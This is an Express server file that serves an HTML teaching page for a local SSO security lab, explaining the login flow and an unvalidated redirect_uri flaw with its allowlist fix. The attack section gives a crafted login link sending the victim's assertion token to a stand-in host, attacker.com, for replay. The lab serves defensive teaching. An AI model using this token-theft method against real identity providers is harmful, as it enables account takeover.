/*
 * Terminal 2: cd auth-concepts/sso && npm run guide
 * SSO Lab — concept guide (port 3065)
 */

const express = require('express');

const app = express();
const PORT = 3065;

const GUIDE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SSO Lab</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Courier New', Courier, monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 {
      font-size: 1.4rem;
      margin-bottom: 0.5rem;
      text-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
    }
    .subtitle { color: #4ade80; margin-bottom: 2rem; font-size: 0.9rem; }
    .flow-box {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
      line-height: 1.9;
      font-size: 0.9rem;
      max-width: 720px;
    }
    .flow-box strong { color: #facc15; }
    .credentials-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
    }
    .credentials-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85rem;
    }
    th {
      text-align: left;
      padding: 0.6rem 0.75rem;
      border-bottom: 1px solid #1a3a1a;
      color: #64748b;
      font-weight: 600;
    }
    td {
      padding: 0.75rem;
      border-bottom: 1px solid #0d1f0d;
      word-break: break-all;
    }
    .empty-state {
      color: #64748b;
      font-style: italic;
      padding: 1rem 0;
    }
    .entry-new { animation: glow 0.6s ease-out; }
    @keyframes glow {
      0% { background: rgba(0, 255, 65, 0.15); }
      100% { background: transparent; }
    }
    .referer-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-top: 2rem;
    }
    .referer-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .referer-panel p {
      font-size: 0.85rem;
      color: #94a3b8;
      line-height: 1.7;
      margin-bottom: 1.25rem;
      max-width: 640px;
    }
    .demo-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
    }
    .demo-btn {
      background: #1e293b;
      color: #e2e8f0;
      border: 1px solid #334155;
      padding: 0.55rem 1rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      font-family: 'Courier New', Courier, monospace;
    }
    .demo-btn:hover { background: #334155; }
    .demo-btn.primary { background: #0d9488; border-color: #0d9488; color: #fff; }
    .demo-btn.primary:hover { background: #0f766e; }
    .target-switcher {
      position: fixed;
      bottom: 1rem;
      left: 1rem;
      display: flex;
      gap: 0.5rem;
      z-index: 9999;
    }
    .target-switcher button {
      padding: 0.4rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid;
    }
    .target-switcher .btn-vulnerable {
      background: #1e293b;
      color: #fff;
      border-color: #334155;
    }
    .target-switcher .btn-vulnerable.active {
      background: #fff;
      color: #1e293b;
      border-color: #fff;
    }
    .target-switcher .btn-protected {
      background: #dc2626;
      color: #fff;
      border-color: #dc2626;
    }
    .target-switcher .btn-protected.active {
      background: #ef4444;
      color: #fff;
      border-color: #ef4444;
    }
    .flow-box { max-width: 900px; }
    .decoded-box {
      background: #0a0a0a; border: 1px solid #1a3a1a; border-radius: 4px;
      padding: 0.75rem; font-size: 0.78rem; color: #cbd5e1;
      white-space: pre-wrap; word-break: break-all; min-height: 60px; margin-top: 0.5rem;
    }
    .result-banner {
      padding: 0.6rem 1rem; border-radius: 4px; font-size: 0.82rem;
      margin-top: 0.75rem; display: none;
    }
    .result-banner.success { background: #052e16; border: 1px solid #16a34a; color: #4ade80; }
    .result-banner.failure { background: #450a0a; border: 1px solid #dc2626; color: #fca5a5; }
    .result-banner.info    { background: #0c1a2e; border: 1px solid #1e40af; color: #93c5fd; }
    input.field {
      background: #111; border: 1px solid #1a3a1a; color: #00ff41;
      font-family: 'Courier New', Courier, monospace; font-size: 0.82rem;
      padding: 0.4rem 0.6rem; border-radius: 4px;
    }
    .section-title {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .flow-box pre { color: #cbd5e1; font-size: 0.78rem; line-height: 1.6; }
    .flow-box p { max-width: 640px; }
  </style>
</head>
<body>
  <h1>🔑 Single Sign-On (SSO) — How It Works</h1>
  <p class="subtitle">One central login (Identity Provider) grants access to multiple apps (Service Providers) without re-entering credentials.</p>

  <div class="flow-box">
    <div class="section-title">SSO Authentication Flow</div>
    <pre>ACTORS:
  User         — wants to access WorkHub
  WorkHub (SP) — Service Provider at localhost:3064
  CorpID (IdP) — Identity Provider at localhost:3064/idp/*

1. User visits WorkHub (SP)
   User                    WorkHub (SP)               CorpID (IdP)
     │                          │                          │
     ├── GET / ────────────────→│                          │
     │                          │ No session found         │
     │                          ├── Redirect to IdP ──────→│
     │←── 302 /idp/login ───────┤  ?client_id=workhub     │
     │    ?redirect_uri=.../callback                       │
     │    &amp;state=abc123                                    │

2. User logs in at CorpID IdP
     ├── GET /idp/login ────────────────────────────────→ │
     │                                                     │ Show CorpID login form
     │←── 200 + login form ──────────────────────────────┤
     │
     ├── POST /idp/authenticate { username, password } ─→ │
     │                                                     │ Validate credentials
     │                                                     │ Issue assertion token (JWT, 2 min)
     │←── 302 /callback?token=eyJ...&amp;state=abc123 ────────┤

3. WorkHub receives assertion
     ├── GET /callback?token=eyJ...&amp;state=abc123 ────────→│
     │                                                     │ Verify JWT signature
     │                                                     │ Create WorkHub session
     │←── 302 /dashboard + Set-Cookie: wh_session ────────┤</pre>
  </div>

  <div class="flow-box">
    <div class="section-title">⚠ Attack: Unvalidated redirect_uri</div>
    <pre>If the IdP does NOT validate redirect_uri:

  Attacker crafts a link:
  http://localhost:3064/idp/login
    ?client_id=workhub-client-id
    &amp;redirect_uri=http://attacker.com/steal   ← ATTACKER'S server
    &amp;state=anyvalue

  Victim clicks the link → sees legitimate CorpID login page → enters credentials

  CorpID issues assertion token and redirects to:
    http://attacker.com/steal?token=eyJhbGciOiJIUzI1NiJ9...

  Attacker receives the assertion token and calls:
    http://localhost:3064/callback?token=&lt;stolen&gt;&amp;state=anyvalue

  Attacker is now logged in as the victim on WorkHub.</pre>
  </div>

  <div class="flow-box">
    <div class="section-title">✅ Fix: Validate redirect_uri Before Redirecting</div>
    <pre style="color:#cbd5e1;font-size:0.78rem;line-height:1.6">// Registered Service Providers with their allowed redirect URIs
const ALLOWED_REDIRECT_URIS = {
  'workhub-client-id': [
    'http://localhost:3064/callback',
    'https://workhub.corp.com/callback'
  ],
  'helpdesk-client-id': [
    'http://localhost:3070/callback'
  ]
};

app.post('/idp/authenticate', (req, res) => {
  const { client_id, redirect_uri } = req.body;
  const allowed = ALLOWED_REDIRECT_URIS[client_id] || [];

  // ✅ Exact match only — no prefix matching, no wildcard
  if (!allowed.includes(redirect_uri)) {
    return res.status(400).json({
      error: 'redirect_uri not allowed',
      provided: redirect_uri,
      allowed: allowed
    });
  }
  // ... proceed with authentication
});</pre>
    <pre style="margin-top:1rem">Rules for redirect_uri validation:
  ✅ Exact string match only — no prefix matching
  ✅ No wildcard subdomains (attacker.evil.workhub.com would match *.workhub.com)
  ✅ Registered at client registration time — not dynamic
  ✅ Log rejected redirect_uris as security events</pre>
  </div>

  <div class="flow-box">
    <div class="section-title">Service Provider vs Identity Provider</div>
    <table style="width:100%;border-collapse:collapse;font-size:0.82rem">
      <tr style="color:#64748b;border-bottom:1px solid #1a3a1a">
        <th style="text-align:left;padding:0.5rem">Role</th>
        <th>Service Provider (SP)</th>
        <th>Identity Provider (IdP)</th>
      </tr>
      <tr style="border-bottom:1px solid #0d1f0d">
        <td style="padding:0.5rem;color:#94a3b8">What it is</td>
        <td style="padding:0.5rem;color:#94a3b8">The app the user wants to use</td>
        <td style="padding:0.5rem;color:#94a3b8">The central login service</td>
      </tr>
      <tr style="border-bottom:1px solid #0d1f0d">
        <td style="padding:0.5rem;color:#94a3b8">Stores credentials?</td>
        <td style="padding:0.5rem;color:#4ade80">No</td>
        <td style="padding:0.5rem;color:#4ade80">Yes (usernames, passwords, MFA)</td>
      </tr>
      <tr style="border-bottom:1px solid #0d1f0d">
        <td style="padding:0.5rem;color:#94a3b8">Examples</td>
        <td style="padding:0.5rem;color:#94a3b8">Slack, GitHub, Salesforce, WorkHub</td>
        <td style="padding:0.5rem;color:#94a3b8">Okta, Azure AD, Google, CorpID</td>
      </tr>
      <tr>
        <td style="padding:0.5rem;color:#94a3b8">Protocols</td>
        <td colspan="2" style="padding:0.5rem;color:#94a3b8">SAML 2.0 (enterprise), OpenID Connect (modern), CAS (legacy)</td>
      </tr>
    </table>
  </div>

  <div class="flow-box">
    <strong>Test redirect_uri Validation (against hardened port 3066)</strong>
    <div style="display:flex;gap:0.5rem;flex-wrap:wrap;margin:0.5rem 0">
      <span style="font-size:0.78rem;color:#64748b">Quick test:</span>
      <button class="demo-btn" style="font-size:0.75rem;padding:0.2rem 0.5rem"
        onclick="document.getElementById('redirect-test-input').value='http://localhost:3066/callback'">
        :3066/callback (registered ✅)
      </button>
      <button class="demo-btn" style="font-size:0.75rem;padding:0.2rem 0.5rem"
        onclick="document.getElementById('redirect-test-input').value='http://localhost:3064/callback'">
        :3064/callback (cross-demo ✅)
      </button>
      <button class="demo-btn" style="font-size:0.75rem;padding:0.2rem 0.5rem"
        onclick="document.getElementById('redirect-test-input').value='http://attacker.com/steal'">
        attacker.com (not registered ✗)
      </button>
      <button class="demo-btn" style="font-size:0.75rem;padding:0.2rem 0.5rem"
        onclick="document.getElementById('redirect-test-input').value='http://localhost:3066/callback?x=1'">
        query param variant ✗
      </button>
    </div>
    <div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap;margin-bottom:0.75rem">
      <input class="field" id="redirect-test-input" style="flex:1"
        placeholder="http://localhost:3064/callback">
      <button class="demo-btn" id="btn-test-redirect">Test</button>
    </div>
    <div class="result-banner" id="redirect-result"></div>
    <pre class="decoded-box" id="redirect-out" style="min-height:60px">–</pre>
  </div>

  <div class="target-switcher">
    <button class="btn-vulnerable" id="btn-vuln">Vulnerable SSO (3064)</button>
    <button class="btn-protected" id="btn-strong">Hardened SSO (3066)</button>
  </div>

  <script>
    function showResult(id, type, msg) {
      var el = document.getElementById(id);
      el.className = 'result-banner ' + type;
      el.textContent = msg;
      el.style.display = 'block';
    }

    document.getElementById('btn-test-redirect').addEventListener('click', async function() {
      var uri = document.getElementById('redirect-test-input').value.trim();
      if (!uri) {
        showResult('redirect-result', 'failure', '✗ Enter a redirect_uri to test');
        return;
      }
      try {
        var url = 'http://localhost:3066/idp/validate-redirect?client_id=workhub-client-id&redirect_uri=' + encodeURIComponent(uri);
        var res = await fetch(url);
        var data = await res.json();
        document.getElementById('redirect-out').textContent = JSON.stringify(data, null, 2);
        showResult('redirect-result', data.allowed ? 'success' : 'failure',
          data.allowed
            ? '✅ Allowed: "' + uri + '" is in the registered allowlist for workhub-client-id'
            : '✗ Rejected: "' + uri + '" — ' + data.reason
        );
      } catch(e) {
        showResult('redirect-result', 'failure', '✗ ' + e.message + ' — is port 3066 running?');
      }
    });

    document.getElementById('btn-vuln').addEventListener('click', function() {
      window.open('http://localhost:3064');
    });
    document.getElementById('btn-strong').addEventListener('click', function() {
      window.open('http://localhost:3066');
    });
  </script>
</body>
</html>`;

app.get('/', function (req, res) {
  res.send(GUIDE_HTML);
});

app.listen(PORT, function () {
  console.log('SSO Lab running at http://localhost:' + PORT);
});
